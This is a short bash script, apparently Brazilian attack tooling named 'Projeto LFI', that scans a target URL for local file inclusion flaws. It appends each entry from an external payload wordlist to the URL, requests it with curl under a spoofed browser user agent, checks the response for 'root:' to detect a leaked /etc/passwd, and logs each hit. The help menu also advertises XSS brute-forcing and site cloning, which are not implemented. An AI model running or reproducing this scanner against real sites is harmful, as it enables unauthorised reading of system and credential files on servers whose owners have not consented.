#!/bin/bash

echo -e "\e[31m______________________________________________________________________________\n"
echo -e "                         "Projeto LFI"" By-Wil08
echo -e "______________________________________________________________________________\n"

                                                                   


url=$2

function lfi()
{

    u=$(echo 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0')
    for lfi in $(cat ./includes/wlist/lfi.lst)
        do
    if $(curl -A "$u" $url$lfi 2>/dev/null | grep -q "root:"); then
    
    echo -e "\n\e[32m[+] Vuln Encontrada! - $lfi\e[39m\n"
    echo -e "\n$url$lfi" >> ./includes/lfi_log.txt
    else
    echo -e "\e[31m[-] Tentando - $lfi"
    fi
    done
    clear
    echo -e "\e[32m                            [+] Vulns Encontradas!\n"
    cat ./includes/lfi_log.txt
}
function help_pg()
{

    clear
    echo -e "\e[32m [+] -lfi - Buscar e explorar falhas LFI\e[0m
    $0 -lfi URL\n"
    
    
}


case $1 in
"-lfi") lfi
;;

*) echo -e "-h for help\n-lfi For check LFI vulns\n-xss for XSS Bruteforce\n--clone URL Para clonar\n-P para buscar palavra nos strings\n-b64=local Para buscar base64 nos strings"
    exit 1
;;
esac
